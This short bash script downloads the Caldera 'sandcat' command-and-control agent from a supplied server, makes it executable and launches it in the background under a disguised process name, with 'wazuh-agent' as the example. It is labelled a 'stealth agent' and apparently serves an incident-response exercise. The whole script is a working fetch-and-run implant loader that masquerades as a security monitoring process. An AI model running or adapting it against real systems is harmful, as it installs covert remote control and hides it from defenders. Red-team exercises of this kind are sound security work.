# 1. Assign command line arguments to variables
# $1 = Caldera URL (e.g., https://10.10.10.10:8888)
# $2 = Agent process name (e.g., wazuh-agent)

server1="$1"
agent1="$2"

# Check if arguments were supplied
if [ -z "$server1" ] || [ -z "$agent1" ]; then
  echo "Usage: $0 <Caldera_URL> <Agent_Process_Name>"
  exit 1
fi

echo "Deploying stealth agent: $agent1"

# 2. Download the agent executable
# Use quotes around $server1 to prevent issues with special characters in the URL
curl -s -X POST -H "file:sandcat.go" -H "platform:linux" "$server1"/file/download > "$agent1"


# Check if download succeeded
if [ $? -ne 0 ]; then
    echo "‚ùå Failed to download agent from $server1"
    exit 1
fi

chmod +x "$agent1"

( exec -a "$agent1" "./$agent1" -server "$server1" -group ir-exercise ) &
